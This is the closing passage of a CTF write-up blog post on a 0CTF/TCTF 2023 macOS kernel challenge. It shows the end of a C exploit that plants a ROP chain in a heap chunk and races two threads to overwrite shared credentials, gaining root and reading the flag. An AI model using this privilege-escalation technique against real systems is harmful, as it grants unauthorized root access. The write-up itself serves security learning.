</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">chain</span><span class="o">++</span> <span class="o">=</span> <span class="n">thread_exception_return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">    <span class="c1">// Store ROPChain in heap chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">leave_message</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x8</span><span class="p">],</span> <span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">      Trigger Race Condition:
</span></span></span><span class="line"><span class="cl"><span class="cm">      - Create a new thread which will call leave_message(0, ropChain, 0x100);
</span></span></span><span class="line"><span class="cl"><span class="cm">      - In the mainthread, keep calling leave_message(1, ropChain+0x8, 0x200);
</span></span></span><span class="line"><span class="cl"><span class="cm">      - Race is success if:
</span></span></span><span class="line"><span class="cl"><span class="cm">        - chunk+0x98 is set to 1
</span></span></span><span class="line"><span class="cl"><span class="cm">        - yet, the chunk+0x8 is not output2, but the gadget that we write via leave_message(0) in the other thread
</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">pthread_t</span> <span class="n">th</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">th</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">race</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">test</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">test</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">loop_end</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">leave_message</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ropChain</span><span class="p">[</span><span class="mh">0x8</span><span class="p">],</span> <span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="c1">// Race will be triggered in baby_read
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// If it is triggered, the shared cred between this child process and parent process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">// will have svuid set to 0, and the parent can become a root.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">baby_read</span><span class="p">(</span><span class="n">test</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Out...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sleep</span><span class="p">(</span><span class="mi">100000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Parent process, will sleep first to wait the child overwriting the shared cred
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Sleep...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// setuid and cat /flag
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nf">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;WIN</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;cat /flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Here...&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><img src="https://i.imgur.com/WDo99N6.png"/>
<blockquote>
<p><strong>Flag: flag{7ac21f7848a39f0aea63fa29d304226a}</strong></p></blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/0ctf-tctf-2023/" data-title="0CTF/TCTF 2023" data-via="Chovid99" data-hashtags="Writeup,0CTF,TCTF,0CTF/TCTF,pwn,kernel,race,macOS,lpe,oob,2023"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/0ctf-tctf-2023/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/0ctf/">0CTF</a>,&nbsp;<a href="/tags/tctf/">TCTF</a>,&nbsp;<a href="/tags/0ctf/tctf/">0CTF/TCTF</a>,&nbsp;<a href="/tags/pwn/">Pwn</a>,&nbsp;<a href="/tags/kernel/">Kernel</a>,&nbsp;<a href="/tags/race/">Race</a>,&nbsp;<a href="/tags/macos/">MacOS</a>,&nbsp;<a href="/tags/lpe/">Lpe</a>,&nbsp;<a href="/tags/oob/">Oob</a>,&nbsp;<a href="/tags/2023/">2023</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/cyber-jawara-2023/" class="prev" rel="prev" title="Cyber Jawara 2023 Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Cyber Jawara 2023 Writeup</a>
            <a href="/posts/asis-ctf-finals-2023/" class="next" rel="next" title="ASIS CTF Finals 2023">ASIS CTF Finals 2023<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
